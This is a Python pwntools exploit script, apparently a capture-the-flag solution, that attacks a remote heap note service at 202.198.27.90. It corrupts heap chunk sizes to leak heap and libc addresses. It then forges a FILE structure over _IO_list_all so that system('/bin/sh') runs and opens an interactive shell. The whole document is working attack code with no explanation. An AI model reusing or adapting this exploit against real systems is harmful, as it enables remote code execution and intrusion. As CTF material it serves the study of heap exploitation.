from pwn import *
context(log_level = 'debug')

#r = process("./pwn")
r = remote("202.198.27.90", 40145)

first_debug = 1
debugging = 0
pausing = 1
def debug(*args):
    global first_debug
    if not debugging: return
    if first_debug:
        gdb.attach(r, *args)
        first_debug = 0
    if pausing: pause()

def parse_u64(raw):
    assert len(raw) <= 8
    return u64(raw.ljust(8, b'\0'))

def add(size, content):
    r.sendlineafter(b'>>> ', b'1')
    r.sendlineafter(b'Size: ', str(size).encode())
    r.sendlineafter(b'Content: ', content)

def edit(idx, content):
    r.sendlineafter(b'>>> ', b'2')
    r.sendlineafter(b'Index: ', str(idx).encode())
    r.sendlineafter(b'New content: ', content)

def view(idx):
    r.sendlineafter(b'>>> ', b'3')
    r.sendlineafter(b'Index: ', str(idx).encode())
    r.recvuntil(b'Your note: ')
    return r.recvuntil(b'Astrageldon', drop = 1)[:-1]

add(0x58, b'a'*0x58+p64(0xfa1))
add(0x1000, b'haha')
edit(0, b'a'*0x58+p64(0x20001))
for i in range(0x1f):
    add(0x1000-0x8, b'yeah!')
edit(0x20, b'a'*(0x1000-0x8)+p64(0x3001))
add(0x1000-0x8, b'yeah!')
add(0x1000-0x8-0x70, b'yeah!')
edit(0x22, b'a'*(0x1000-0x8-0x70)+p64(0x601))
add(0x1000-0x8, b'cool~')
heap_base = parse_u64(view(1)) - 0x20ff0

edit(0x23, b'a'*(0x1000-0x8) + p64(0xff1))
add(0x1000, b'haha')
edit(0x23, b'a'*(0x1000-0x8)+p64(0x20001))
for i in range(0x1f):
    add(0x1000-0x8, b'yeah!')
edit(0x43, b'a'*(0x1000-0x8)+p64(0x3001))
add(0x1000-0x8-0x10, b'yeah!')
libc_base = parse_u64(view(0x24)) - 0x3966b8
_IO_list_all = libc_base + 0x397080
system = libc_base + 0x3f110
success('Heap Base: %s' % hex(heap_base))
success('Libc Base: %s' % hex(libc_base))
success('Victim: %s' % hex(_IO_list_all - 0x10))
#debug()

payload1 = b'/bin/sh\0' + p64(0x61) + p64(0) + p64(_IO_list_all - 0x10) + p64(0) + p64(1)
payload2 = p64(heap_base + 0x430d8) + p64(0)*2 + p64(system)
edit(0x44, b'a'*(0x1000-0x10-0x10) + payload1.ljust(0xd8, b'\0') + payload2)
debug()
r.sendlineafter(b'>>> ', b'1')
r.sendlineafter(b'Size: ', b'1337')
#debug()

r.interactive()
r.close()
